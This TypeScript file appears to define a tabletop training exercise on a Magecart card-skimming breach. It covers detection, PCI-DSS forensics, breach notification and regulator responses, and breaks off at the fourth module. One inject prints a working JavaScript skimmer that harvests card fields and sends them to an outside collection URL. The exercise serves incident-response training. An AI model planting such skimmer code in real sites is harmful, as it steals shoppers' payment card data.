import type { LibraryEntry } from '../library'

export const magecartRetailScenario: LibraryEntry = {
  id: 'magecart-retail-001',
  title: 'Magecart Web Skimming Attack',
  category: 'data_breach',
  difficulty: 'intermediate',
  duration: 150,
  description: 'A threat actor injects malicious JavaScript into your e-commerce checkout pages, stealing customer payment card data in real-time. Based on real-world Magecart attacks against British Airways, Ticketmaster, and thousands of e-commerce sites. This exercise tests web application security monitoring, PCI-DSS incident response, and customer breach notification procedures.',
  tags: ['magecart', 'web-skimming', 'javascript', 'e-commerce', 'pci-dss', 'credit-card', 'supply-chain', 'formjacking'],
  moduleCount: 4,
  injectCount: 15,
  questionCount: 14,
  scenario: {
    id: 'magecart-retail-001',
    title: 'Magecart Web Skimming Attack',
    description: 'A threat actor injects malicious JavaScript into your e-commerce checkout pages, stealing customer payment card data in real-time. Based on real-world Magecart attacks against British Airways, Ticketmaster, and thousands of e-commerce sites.',
    version: '1.0.0',
    author: 'CTEP Framework',
    createdAt: '2025-01-15T00:00:00Z',
    updatedAt: '2025-01-15T00:00:00Z',
    threatCategory: 'data_breach',
    difficulty: 'intermediate',
    estimatedDuration: 150,
    targetAudience: ['Web Development/DevOps', 'Application Security', 'PCI Compliance', 'Legal/Privacy', 'Customer Service', 'Executive Leadership'],
    objectives: [
      'Detect client-side JavaScript injection attacks on e-commerce platforms',
      'Understand the Magecart attack chain and third-party JavaScript risks',
      'Practice PCI-DSS breach notification and forensic investigation requirements',
      'Coordinate response across development, security, compliance, and legal teams',
      'Develop customer communication strategy for payment card breaches'
    ],
    facilitatorGuide: {
      id: 'fg-magecart-001',
      createdAt: '2025-01-15T00:00:00Z',
      updatedAt: '2025-01-15T00:00:00Z',
      title: 'Facilitator Guide - Magecart Scenario',
      type: 'facilitator_guide',
      format: 'markdown',
      content: 'This scenario is based on Magecart group operations that have compromised major retailers including British Airways (380,000 cards), Ticketmaster (40,000+ cards via third-party), and thousands of smaller e-commerce sites. Key themes: (1) Third-party JavaScript as attack vector, (2) Client-side attacks evade server-side security, (3) PCI-DSS forensic investigation requirements, (4) Card brand notification timelines. The British Airways attack resulted in a 183M GBP GDPR fine (later reduced). Emphasize the regulatory and legal consequences alongside technical response.'
    },
    additionalMaterials: [],
    settings: {
      allowParticipantSkip: false,
      requireAllResponses: true,
      showInjectTimestamps: true,
      enableAnonymousResponses: false
    },
    modules: [
      {
        id: 'mc-mod-1-detection',
        createdAt: '2025-01-15T00:00:00Z',
        updatedAt: '2025-01-15T00:00:00Z',
        order: 1,
        title: 'Detection of Malicious Script',
        description: 'An external security researcher reports suspicious behavior on your checkout page, leading to the discovery of a web skimming attack.',
        phase: 'detection',
        suggestedDuration: 35,
        facilitatorNotes: 'Many Magecart compromises are discovered by external parties, not internal monitoring. Discuss why client-side attacks are difficult to detect with traditional security tools.',
        injects: [
          {
            id: 'mc-inj-1-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            title: 'Security Researcher Report',
            content: 'EMAIL TO: security@company.com\nFROM: Alex Torres <atorres@websecresearch.com>\nSUBJECT: Responsible Disclosure - Malicious Script on Checkout Page\n\n---\n\nHi Security Team,\n\nI\'m a security researcher specializing in e-commerce threats. During routine monitoring of Magecart-style attacks, I discovered that your website appears to be compromised.\n\nFINDINGS:\n\n1. Your checkout page (shop.company.com/checkout) is loading an obfuscated JavaScript file from:\n   cdn-analytics[.]com/tracker.js\n\n2. This script is capturing form data from payment fields and exfiltrating it to:\n   https://collection-api[.]net/log\n\n3. The script activates only on pages with payment forms and uses anti-debugging techniques to evade developer tools.\n\n4. Based on my analysis, this has been present for approximately 3-4 weeks (based on Wayback Machine comparison).\n\nI have NOT attempted to exploit this or access any customer data. I\'m reporting this to help you remediate.\n\nI\'ve attached:\n- Screenshot of the malicious script in page source\n- Decoded/deobfuscated version of the skimmer code\n- Network capture showing exfiltration\n\nPlease acknowledge receipt and let me know if you need additional information.\n\nRegards,\nAlex Torres\nWeb Security Research\n\nPGP Key: [attached]\n\n---\n\nNote: The researcher appears legitimate based on quick verification (published CVEs, conference talks, Twitter following in security community).',
            type: 'information',
            severity: 'critical',
            triggerTime: 0,
            source: 'External Security Researcher',
            facilitatorNotes: 'External discovery is common for Magecart. The 3-4 week estimate means significant customer exposure. Verify the researcher is legitimate before engaging, but don\'t delay investigation.',
            expectedActions: ['Verify the report', 'Check the checkout page', 'Engage application security team', 'Do NOT publicly acknowledge before verification'],
            attachments: [],
            relatedQuestionIds: ['mc-q-1-1']
          },
          {
            id: 'mc-inj-1-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            title: 'Technical Verification',
            content: 'APPLICATION SECURITY ANALYSIS\nAnalyst: Sarah Kim\n\nCONFIRMED: The researcher\'s report is accurate.\n\nTECHNICAL FINDINGS:\n\n1. Malicious Script Location:\n   - Injected via compromised third-party chat widget (support-chat-widget.js)\n   - Chat widget vendor: LiveAssist Pro (third-party SaaS)\n   - Our implementation loads their script from: cdn.liveassistpro.com/widget.js\n   - That script was modified to include loader for the skimmer\n\n2. Skimmer Behavior:\n   - Monitors DOM for payment form fields\n   - Captures: card number, expiry, CVV, name, billing address\n   - Base64 encodes captured data\n   - Exfiltrates via fake tracking pixel to collection-api[.]net\n   - Includes anti-analysis: debugger detection, VM detection\n\n3. Timeline Analysis:\n   - First seen in our CSP violation logs: 22 days ago\n   - CSP was in report-only mode, not blocking\n   - We received 47 CSP violation reports but they were not investigated\n\n4. Scope:\n   - Affected pages: /checkout, /payment, /order-review\n   - All customers who completed checkout in last 22 days are potentially affected\n\nATTACHED: Deobfuscated skimmer code sample\n\n```javascript\n// Partial deobfuscated code\n(function() {\n  var targets = [\'cardnumber\', \'cc-number\', \'card_number\', \n                 \'cvv\', \'cvc\', \'expiry\', \'cc-exp\'];\n  var exfil = \'https://collection-api.net/log?d=\';\n  \n  function harvest() {\n    var data = {};\n    targets.forEach(function(t) {\n      var el = document.querySelector(\'[name*=\"\' + t + \'\"]\');\n      if (el) data[t] = el.value;\n    });\n    if (Object.keys(data).length > 0) {\n      new Image().src = exfil + btoa(JSON.stringify(data));\n    }\n  }\n  setInterval(harvest, 500);\n})();\n```',
            type: 'technical',
            severity: 'critical',
            triggerTime: 10,
            source: 'Application Security',
            facilitatorNotes: 'The third-party chat widget was the vector - a classic supply chain attack. The CSP violations were ignored for 22 days - discuss monitoring gaps. The code sample shows the simplicity yet effectiveness of skimmers.',
            expectedActions: ['Remove the malicious script immediately', 'Contact the third-party vendor', 'Preserve evidence before remediation', 'Estimate affected customer count'],
            attachments: [],
            relatedQuestionIds: ['mc-q-1-2']
          },
          {
            id: 'mc-inj-1-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            title: 'Third-Party Vendor Response',
            content: 'VENDOR COMMUNICATION\nFrom: LiveAssist Pro Security Team\nSubject: RE: Urgent Security Incident - Script Compromise\n\n---\n\nThank you for alerting us. We have confirmed that our CDN was compromised.\n\nOur preliminary findings:\n\n1. An attacker gained access to our CDN management console via compromised employee credentials\n\n2. They modified widget.js to include a loader for the skimmer payload\n\n3. The modification occurred 24 days ago\n\n4. We estimate 300+ customers using our widget were affected\n\n5. We have:\n   - Reverted to clean version of our script\n   - Rotated all credentials\n   - Engaged forensic investigators\n\nYou should:\n- Update your implementation to use our Subresource Integrity (SRI) hash\n- Clear any cached versions of our script\n- Implement CSP to restrict script sources\n\nWe will be notifying all affected customers formally within 24 hours.\n\nOur legal team will be in touch regarding shared responsibilities.\n\n---\n\nNote: This means YOUR customers were affected because of THEIR security failure. But you loaded their script - shared liability questions will arise.',
            type: 'information',
            severity: 'high',
            triggerTime: 20,
            source: 'Third-Party Vendor',
            facilitatorNotes: 'Supply chain compromise - the vendor was the root cause, but you chose to use their script. Discuss shared responsibility, vendor security requirements, and the Ticketmaster/Inbenta precedent.',
            expectedActions: ['Document vendor communication', 'Assess liability implications', 'Implement SRI for all third-party scripts', 'Review other third-party dependencies'],
            attachments: [],
            relatedQuestionIds: ['mc-q-1-3']
          },
          {
            id: 'mc-inj-1-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            title: 'Customer Impact Assessment',
            content: 'DATA BREACH SCOPING REPORT\nSource: E-Commerce Platform Team\n\nAFFECTED TRANSACTIONS ANALYSIS:\n\nTime Period: 22 days (from script injection to removal)\n\nTotal checkout completions: 127,453\n\nPayment methods used:\n- Credit/Debit Card: 98,234 (77%)\n- PayPal: 18,421 (14%) - NOT AFFECTED (redirect to PayPal)\n- Apple Pay: 10,798 (9%) - NOT AFFECTED (tokenized)\n\nAFFECTED CUSTOMERS: 98,234 payment cards potentially compromised\n\nData captured by skimmer:\n- Full card number (PAN)\n- Expiration date\n- CVV/CVC\n- Cardholder name\n- Billing address\n\nGeographic distribution:\n- United States: 67,234 (68%)\n- United Kingdom: 12,453 (13%)\n- Canada: 8,234 (8%)\n- EU (other): 7,123 (7%)\n- Rest of world: 3,190 (3%)\n\nCustomer categories:\n- Consumer retail: 89,234\n- Business accounts: 9,000\n\nNote: 23% of affected customers have accounts with saved payment methods. Their data was captured during this incident, but they may have been compromised in prior transactions as well.',
            type: 'information',
            severity: 'critical',
            triggerTime: 30,
            source: 'Data Analytics Team',
            facilitatorNotes: '98,234 cards is a significant breach. The multi-jurisdictional exposure (US, UK, EU) triggers multiple regulatory frameworks. PayPal and Apple Pay customers were protected - discuss the value of tokenization.',
            expectedActions: ['Finalize affected customer list', 'Segment by jurisdiction for notification', 'Begin PCI forensic investigation', 'Prepare for card brand notification'],
            attachments: [],
            relatedQuestionIds: ['mc-q-1-4']
          }
        ],
        discussionQuestions: [
          {
            id: 'mc-q-1-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            question: 'The compromise was discovered by an external researcher, not internal security. What monitoring capabilities would have detected this client-side JavaScript attack?',
            category: 'technical',
            responseType: 'text',
            guidanceNotes: 'Discuss CSP monitoring, client-side security tools, third-party script inventories, and the limitations of server-side security for client-side attacks.',
            expectedThemes: ['CSP implementation', 'Client-side monitoring', 'Third-party script inventory', 'Real-time JS monitoring']
          },
          {
            id: 'mc-q-1-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            question: 'CSP violation reports were received for 22 days but not investigated. What process failures allowed these warnings to be ignored, and how should CSP alerts be handled?',
            category: 'policy',
            responseType: 'text',
            guidanceNotes: 'Discuss alert fatigue, CSP tuning, report-only vs enforcement mode, and the need for dedicated monitoring of security headers.',
            expectedThemes: ['Alert fatigue', 'CSP monitoring process', 'Report-only mode risks', 'Security header monitoring']
          },
          {
            id: 'mc-q-1-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            question: 'Your website was compromised because a third-party vendor was breached. How do you assess and manage the security of third-party JavaScript providers?',
            category: 'policy',
            responseType: 'text',
            guidanceNotes: 'Discuss vendor security assessments, SRI implementation, third-party script inventories, and contractual security requirements.',
            expectedThemes: ['Vendor assessment', 'SRI implementation', 'Script inventory', 'Contractual requirements']
          },
          {
            id: 'mc-q-1-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            question: 'PayPal and Apple Pay customers were not affected because those payment methods use tokenization/redirects. Should you mandate these payment methods and deprecate direct card entry?',
            category: 'decision',
            responseType: 'text',
            guidanceNotes: 'Discuss the tradeoff between security and customer experience, conversion rate impacts, and the future of payment security.',
            expectedThemes: ['Tokenization benefits', 'Customer experience', 'Conversion impact', 'Payment security strategy']
          }
        ]
      },
      {
        id: 'mc-mod-2-containment',
        createdAt: '2025-01-15T00:00:00Z',
        updatedAt: '2025-01-15T00:00:00Z',
        order: 2,
        title: 'Containment and Evidence Preservation',
        description: 'The malicious script must be removed while preserving evidence for forensic investigation and regulatory requirements.',
        phase: 'containment',
        suggestedDuration: 35,
        facilitatorNotes: 'PCI-DSS has specific requirements for forensic investigation by a PCI Forensic Investigator (PFI). Evidence preservation is critical.',
        injects: [
          {
            id: 'mc-inj-2-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            title: 'Remediation Decision Point',
            content: 'URGENT DECISION REQUIRED\nFrom: CISO\n\nWe need to decide on remediation approach:\n\nOPTION A: Immediate Script Removal\n- Remove the chat widget and malicious script NOW\n- Stops ongoing card theft immediately\n- Risk: May destroy evidence needed for forensic investigation\n- Risk: Attacker may notice and cover tracks elsewhere\n\nOPTION B: Controlled Remediation (2-4 hours)\n- Capture full evidence package first\n- Forensic imaging of web servers\n- Network traffic capture of exfiltration\n- Then remove malicious code\n- Risk: Additional cards compromised during delay\n\nOPTION C: Stealth Monitoring (not recommended)\n- Leave script in place\n- Modify to capture attacker activity\n- Work with law enforcement\n- Risk: Continued customer harm, liability issues\n\nLegal Counsel notes: "Every hour we delay removal while knowing about the breach increases our liability. PCI requirements are clear about timely response."\n\nDevOps notes: "We can take a full server snapshot in 15 minutes. We have network captures from our WAF."\n\nMy recommendation: Option B with aggressive 30-minute timeline. Thoughts?',
            type: 'decision_point',
            severity: 'critical',
            triggerTime: 0,
            source: 'CISO',
            facilitatorNotes: 'This is a real tension in breach response. Evidence preservation matters for PFI investigation, but ongoing customer harm must stop. The 30-minute accelerated Option B is reasonable.',
            expectedActions: ['Make remediation decision', 'Document decision rationale', 'Coordinate evidence preservation', 'Prepare for script removal'],
            attachments: [],
            relatedQuestionIds: ['mc-q-2-1']
          },
          {
            id: 'mc-inj-2-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            title: 'PCI Forensic Investigation Requirements',
            content: 'COMPLIANCE NOTIFICATION\nFrom: PCI Compliance Team\n\nAs a Level 1 merchant, the following PCI-DSS breach requirements apply:\n\n1. IMMEDIATE (Within 24 hours):\n   - Notify acquiring bank of suspected breach\n   - Engage PCI Forensic Investigator (PFI) from approved list\n   - Preserve all evidence\n\n2. CARD BRAND NOTIFICATION (Within 24-72 hours):\n   - Visa: Account Data Compromise Event report within 24 hours\n   - Mastercard: Account Data Compromise notification within 24 hours\n   - American Express: Within 24 hours\n   - Discover: Within 48 hours\n\n3. PFI INVESTIGATION:\n   - Must be conducted by approved PFI\n   - We must NOT conduct our own forensics that could taint evidence\n   - PFI will determine final scope of compromise\n   - Timeline: 10-15 business days for preliminary report\n\n4. POTENTIAL CONSEQUENCES:\n   - Card brand fines: $5,000 - $100,000 per month of non-compliance\n   - Fraud liability for compromised cards\n   - Increased transaction fees\n   - Potential loss of ability to process cards\n\nOur acquiring bank (First National Processing) has been notified. They are demanding a call within the hour.\n\nNote: Our cyber insurance requires PFI from their approved panel.',
            type: 'regulatory',
            severity: 'high',
            triggerTime: 8,
            source: 'PCI Compliance',
            facilitatorNotes: 'PCI requirements are specific and time-bound. The PFI requirement means you cannot simply use your own IR firm for the forensic investigation. Insurance panel requirements add complexity.',
            expectedActions: ['Contact acquiring bank', 'Engage approved PFI', 'Prepare card brand notifications', 'Coordinate with insurance'],
            attachments: [],
            relatedQuestionIds: ['mc-q-2-2']
          },
          {
            id: 'mc-inj-2-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            title: 'Website Restoration Challenges',
            content: 'TECHNICAL UPDATE\nFrom: DevOps Team\n\nMalicious script has been removed. However, we\'ve discovered additional issues:\n\n1. SCRIPT INVENTORY:\n   - Our checkout pages load 23 different third-party scripts\n   - 7 of these are not in our documented inventory\n   - Marketing added 3 scripts without security review\n   - We cannot verify integrity of 4 legacy scripts\n\n2. CSP ENFORCEMENT CHALLENGES:\n   - Strict CSP breaks 4 third-party integrations\n   - Analytics, chat, reviews, and recommendations affected\n   - Full CSP enforcement will impact functionality\n   - Marketing pushing back: "We need these for conversion tracking"\n\n3. ADDITIONAL FINDINGS:\n   - Possible second skimmer variant found in image metadata\n   - Investigating suspicious activity on admin panel\n   - One developer account shows unusual access patterns\n\n4. RECOMMENDED ACTIONS:\n   - Disable all non-essential third-party scripts\n   - Implement strict CSP in enforcement mode\n   - Rebuild checkout from known-good code\n   - Full audit of all JavaScript dependencies\n\nEstimated time to fully hardened checkout: 4-6 hours\nBusiness impact: Some site features will be degraded',
            type: 'technical',
            severity: 'high',
            triggerTime: 18,
            source: 'DevOps Team',
            facilitatorNotes: 'The "23 third-party scripts" situation is common in e-commerce. Marketing vs. security tension is real. The possible second skimmer and suspicious admin access suggest deeper compromise.',
            expectedActions: ['Prioritize checkout security', 'Negotiate with marketing on essential scripts', 'Investigate second compromise', 'Audit developer access'],
            attachments: [],
            relatedQuestionIds: ['mc-q-2-3']
          },
          {
            id: 'mc-inj-2-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            title: 'Acquiring Bank Call',
            content: 'CALL SUMMARY\nParticipants: CFO, CISO, General Counsel, First National Processing (acquiring bank)\n\nBank Representative Statement:\n\n"Given the scope of this compromise - nearly 100,000 cards over 22 days - this is a significant event. Here\'s what happens next:\n\n1. We\'re placing a temporary hold on your merchant account pending PFI investigation\n2. Your reserve amount is being increased from 5% to 15% of processing volume\n3. Depending on PFI findings, you may face:\n   - Card brand fines ($50,000 - $500,000 based on similar cases)\n   - Fraud chargeback liability (typically 10-15% of compromised cards see fraud)\n   - Potential PCI compliance reassessment\n\n4. If fraud rates on compromised cards exceed thresholds:\n   - Visa/Mastercard may add you to MATCH list\n   - This effectively ends your ability to process cards\n\n5. Positive factors in your favor:\n   - Self-discovery (sort of - researcher found it)\n   - Rapid response once discovered\n   - Cooperation with investigation\n\nWe need your PFI engagement letter by end of business tomorrow.\n\nQuestion: Do you have cyber insurance that covers PCI fines and assessments?"',
            type: 'information',
            severity: 'high',
            triggerTime: 28,
            source: 'Acquiring Bank Call',
            facilitatorNotes: 'The MATCH list (Member Alert to Control High-risk merchants) is effectively a death sentence for e-commerce. The financial exposure is significant. Discuss insurance coverage and business continuity.',
            expectedActions: ['Expedite PFI engagement', 'Review insurance coverage', 'Prepare for increased reserves', 'Assess financial exposure'],
            attachments: [],
            relatedQuestionIds: ['mc-q-2-4']
          }
        ],
        discussionQuestions: [
          {
            id: 'mc-q-2-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            question: 'You must balance stopping ongoing card theft against preserving evidence for forensic investigation. How do you make this decision, and what is an acceptable delay?',
            category: 'decision',
            responseType: 'text',
            guidanceNotes: 'Discuss the ethical and legal considerations, rapid evidence preservation techniques, and the customer harm calculus.',
            expectedThemes: ['Customer harm priority', 'Rapid evidence capture', 'Legal liability', 'Decision documentation']
          },
          {
            id: 'mc-q-2-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            question: 'PCI-DSS requires a PCI Forensic Investigator for the investigation, and your insurance requires their approved panel. How do you manage these overlapping requirements?',
            category: 'coordination',
            responseType: 'text',
            guidanceNotes: 'Discuss pre-incident PFI relationships, insurance policy review, and the coordination between compliance and insurance requirements.',
            expectedThemes: ['PFI pre-arrangement', 'Insurance coordination', 'Compliance requirements', 'Vendor management']
          },
          {
            id: 'mc-q-2-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            question: 'Marketing added third-party scripts without security review, and strict CSP will break site functionality. How do you resolve the tension between marketing needs and security requirements?',
            category: 'policy',
            responseType: 'text',
            guidanceNotes: 'Discuss script governance processes, marketing/security collaboration, and the business case for security controls.',
            expectedThemes: ['Script governance', 'Cross-functional process', 'Risk-based decisions', 'Security as enabler']
          },
          {
            id: 'mc-q-2-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            question: 'The acquiring bank is increasing reserves and warning about potential MATCH listing. What contingency plans should exist for potential loss of card processing ability?',
            category: 'resource',
            responseType: 'text',
            guidanceNotes: 'Discuss business continuity for payment processing, alternative payment methods, and the existential risk of MATCH listing.',
            expectedThemes: ['Payment processing continuity', 'Alternative processors', 'Business survival', 'Risk mitigation']
          }
        ]
      },
      {
        id: 'mc-mod-3-notification',
        createdAt: '2025-01-15T00:00:00Z',
        updatedAt: '2025-01-15T00:00:00Z',
        order: 3,
        title: 'Customer and Regulatory Notification',
        description: 'With the breach contained, the organization must navigate complex notification requirements across multiple jurisdictions while managing customer communications.',
        phase: 'recovery',
        suggestedDuration: 40,
        facilitatorNotes: 'Multi-jurisdictional notification (US states, UK GDPR, EU GDPR) creates significant complexity. The British Airways fine ($230M proposed, $26M final) looms large.',
        injects: [
          {
            id: 'mc-inj-3-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            title: 'Notification Requirements Matrix',
            content: 'LEGAL MEMO - BREACH NOTIFICATION REQUIREMENTS\nFrom: Privacy/Data Protection Counsel\n\nBased on geographic distribution of affected customers:\n\nUNITED STATES (67,234 affected):\n- 50 different state breach notification laws apply\n- Strictest timeline: 30 days (some states)\n- California: CCPA notification + potential $750/consumer statutory damages\n- New York: SHIELD Act requirements\n- Payment card data triggers notification in all states\n\nUNITED KINGDOM (12,453 affected):\n- ICO notification within 72 hours of awareness\n- Individual notification "without undue delay"\n- Potential fine: Up to 4% of global annual revenue or 17.5M GBP\n- NOTE: British Airways fined 20M GBP for similar Magecart attack\n\nEUROPEAN UNION (7,123 affected):\n- GDPR 72-hour notification to lead supervisory authority\n- Individual notification if "high risk to rights and freedoms"\n- Payment card + CVV = high risk\n- Cross-border processing - must identify lead authority\n\nCANADA (8,234 affected):\n- PIPEDA: Notification to Privacy Commissioner\n- Notification to individuals if "real risk of significant harm"\n- Payment card data = significant harm\n\nRECOMMENDATION:\n- UK/EU: Notify regulators within 72 hours (deadline: tomorrow 5 PM)\n- US: Begin state notifications immediately, prioritize California\n- All: Customer notification within 7 days\n\nDraft notifications attached for review.',
            type: 'regulatory',
            severity: 'high',
            triggerTime: 0,
            source: 'Legal/Privacy',
            facilitatorNotes: 'The British Airways fine reference is intentional - same attack type, similar consequences. The 72-hour GDPR deadline creates urgency. Multi-state US notification is operationally complex.',
            expectedActions: ['Prioritize UK/EU regulatory notification', 'Prepare state-by-state US notifications', 'Develop customer notification content', 'Coordinate across jurisdictions'],
            attachments: [],
            relatedQuestionIds: ['mc-q-3-1']
          },
          {
            id: 'mc-inj-3-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            title: 'Customer Notification Draft',
            content: 'DRAFT CUSTOMER NOTIFICATION\nFor Review: Legal, PR, Executive\n\n---\n\nSubject: Important Information About Your Recent Purchase\n\nDear Valued Customer,\n\nWe are writing to inform you of a security incident that may have affected your payment information.\n\nWHAT HAPPENED:\nBetween [DATE] and [DATE], our website was affected by malicious code that may have captured payment card information entered during checkout.\n\nWHAT INFORMATION WAS INVOLVED:\n- Payment card number\n- Card expiration date\n- CVV security code\n- Cardholder name\n- Billing address\n\nWHAT WE ARE DOING:\n- Removed the malicious code immediately upon discovery\n- Engaged cybersecurity experts to investigate\n- Notified law enforcement and card brands\n- Implemented additional security measures\n\nWHAT YOU CAN DO:\n- Monitor your card statements for unauthorized charges\n- Consider placing a fraud alert with credit bureaus\n- We are offering [12/24] months of complimentary identity monitoring\n\n[ENROLLMENT INSTRUCTIONS]\n\nWe sincerely apologize for this incident...\n\n---\n\nQUESTIONS FROM REVIEW:\n\nCFO: "Do we have to mention CVV? That makes it sound worse."\nLegal: "Yes, we must be specific about data types affected."\nPR: "Can we say \'may have affected\' or do we have to say \'was affected\'?"\nCISO: "Our evidence shows the script captured everything - we should say \'was affected\'."\nCEO: "What about the third-party vendor - should we mention them?"',
            type: 'communication',
            severity: 'medium',
            triggerTime: 12,
            source: 'Communications Team',
            facilitatorNotes: 'The review questions reflect real tensions in breach notification drafting. Transparency vs. legal exposure. The CVV mention is required for accuracy. Third-party mention is debatable.',
            expectedActions: ['Finalize notification language', 'Address executive concerns', 'Establish notification timeline', 'Set up customer support resources'],
            attachments: [],
            relatedQuestionIds: ['mc-q-3-2']
          },
          {
            id: 'mc-inj-3-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            title: 'Media Inquiry',
            content: 'URGENT - MEDIA INQUIRY\nFrom: PR Team\n\nBrian Chen from Bloomberg has contacted us:\n\n"Hi, Brian Chen from Bloomberg here. I\'m working on a story about e-commerce skimming attacks and understand your company may have been affected by a Magecart-style compromise. \n\nI\'d like to ask:\n1. Can you confirm a breach occurred?\n2. How many customers were affected?\n3. How long was the malicious code active?\n4. Was a third-party vendor involved?\n5. What security measures have you implemented?\n\nWe\'re planning to publish tomorrow. Please respond by 5 PM for inclusion."\n\nAdditional context:\n- The security researcher who reported the breach has a significant Twitter following\n- Other researchers are now analyzing the malicious domain infrastructure\n- Industry publications are likely to pick up the story regardless\n\nOptions:\n1. Decline to comment\n2. Provide brief statement confirming incident without details\n3. Full transparency - provide comprehensive response\n4. Request delay until customer notification complete',
            type: 'media',
            severity: 'medium',
            triggerTime: 22,
            source: 'Public Relations',
            facilitatorNotes: 'Media pressure accelerates during breach response. The researcher\'s social media presence means this will become public regardless. Discuss proactive vs. reactive communication.',
            expectedActions: ['Develop media response strategy', 'Prepare holding statement', 'Coordinate with legal on disclosures', 'Plan for public announcement'],
            attachments: [],
            relatedQuestionIds: ['mc-q-3-3']
          },
          {
            id: 'mc-inj-3-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            title: 'ICO Notification Response',
            content: 'REGULATORY COMMUNICATION\nFrom: UK Information Commissioner\'s Office (ICO)\n\nRE: Data Breach Notification Reference ICO-2025-XXXX\n\nThank you for your notification regarding the personal data breach affecting UK residents.\n\nWe note the following concerns:\n\n1. DETECTION TIMELINE:\n   - You state the breach was active for 22 days\n   - CSP violations were logged but not investigated\n   - This raises questions about your monitoring capabilities\n\n2. THIRD-PARTY MANAGEMENT:\n   - The breach originated from a third-party script\n   - We will require evidence of your due diligence on third-party processors\n   - Please provide contracts and security assessments for the affected vendor\n\n3. DATA MINIMIZATION:\n   - CVV codes were captured. Do you have a legitimate basis for processing CVV?\n   - (Note: CVV should not be stored post-authorization under PCI-DSS)\n\nPLEASE PROVIDE WITHIN 14 DAYS:\n1. Complete forensic investigation report\n2. Third-party security assessment documentation\n3. Evidence of data minimization practices\n4. Remediation plan and implementation timeline\n5. Customer notification sent to UK residents\n\nWe reserve the right to conduct a formal investigation based on your response.\n\nNote: Given similarity to British Airways case (ICO decision 2020), please ensure your response addresses preventive measures.',
            type: 'regulatory',
            severity: 'high',
            triggerTime: 32,
            source: 'ICO (UK)',
            facilitatorNotes: 'The ICO response shows the regulatory scrutiny that follows breach notification. The British Airways reference is intentional pressure. The CVV question is a good catch - CVV shouldn\'t be stored, but skimmers capture it in transit.',
            expectedActions: ['Prepare detailed ICO response', 'Gather vendor documentation', 'Document remediation measures', 'Engage UK legal counsel'],
            attachments: [],
            relatedQuestionIds: ['mc-q-3-4']
          }
        ],
        discussionQuestions: [
          {
            id: 'mc-q-3-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            question: 'You have 72 hours to notify UK and EU regulators, but the forensic investigation is not complete. How do you balance speed of notification with accuracy of information?',
            category: 'coordination',
            responseType: 'text',
            guidanceNotes: 'Discuss preliminary vs. final notifications, what must be known vs. can be updated, and the GDPR Article 33 requirements.',
            expectedThemes: ['Preliminary notification', 'Information evolution', 'Regulatory expectations', 'Update procedures']
          },
          {
            id: 'mc-q-3-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            question: 'The CFO wants to minimize breach severity language, but legal says you must be specific. How do you navigate internal disagreements about notification content?',
            category: 'communication',
            responseType: 'text',
            guidanceNotes: 'Discuss the legal requirements for accuracy, reputational considerations, and the governance of breach notification content.',
            expectedThemes: ['Accuracy requirements', 'Internal governance', 'Legal review', 'Stakeholder alignment']
          },
          {
            id: 'mc-q-3-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            question: 'A reporter is asking about the breach and plans to publish tomorrow. Should you try to delay, decline comment, or get ahead of the story?',
            category: 'communication',
            responseType: 'text',
            guidanceNotes: 'Discuss proactive vs. reactive media strategy, controlling the narrative, and the impact of media coverage on customer trust.',
            expectedThemes: ['Proactive communication', 'Media strategy', 'Narrative control', 'Customer trust']
          },
          {
            id: 'mc-q-3-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            question: 'The ICO is asking about your third-party security assessment for the compromised vendor. If those assessments were inadequate, how do you respond?',
            category: 'policy',
            responseType: 'text',
            guidanceNotes: 'Discuss honesty vs. legal exposure, remediation commitments, and the documentation requirements for vendor management.',
            expectedThemes: ['Regulatory honesty', 'Remediation focus', 'Vendor management gaps', 'Future improvements']
          }
        ]
      },
      {
        id: 'mc-mod-4-recovery',
        createdAt: '2025-01-15T00:00:00Z',
        updatedAt: '2025-01-15T00:00:00Z',
        order: 4,
        title: 'Long-term Recovery and Prevention',
        description: 'With immediate crisis managed, the organization implements lasting security improvements and addresses the financial and reputational fallout.',
        phase: 'post_incident',
